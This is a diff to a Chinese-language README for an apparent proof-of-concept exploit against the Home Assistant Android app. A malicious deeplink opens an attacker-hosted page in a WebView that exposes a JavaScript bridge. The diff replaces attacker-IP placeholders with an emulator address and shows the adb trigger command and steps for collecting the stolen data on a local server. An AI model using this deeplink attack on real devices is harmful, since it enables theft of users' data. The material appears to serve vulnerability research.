@@ -7,7 +7,7 @@ Home Assistant WebView 通过 `addJavascriptInterface` 暴露了 `HomeAppBridge`
 ## 触发方式
 
 ```
-homeassistant://webview?url=http://<ATTACKER_IP>:8000/exp/1.1
+homeassistant://webview?url=http://10.0.2.2:8000/exp/1.1
 ```
 
 ## 启动服务
@@ -33,7 +33,7 @@ python server.py
 1. 启动服务器: `python server.py`
 2. 在模拟器中通过 adb 触发 Deeplink:
    ```
-   adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://<本机IP>:8000/exp/1.1"
+   adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/1.1"
    ```
 3. 观察 `received/` 目录下生成的回收数据文件
 4. 检查 logcat 确认 Bridge 调用日志
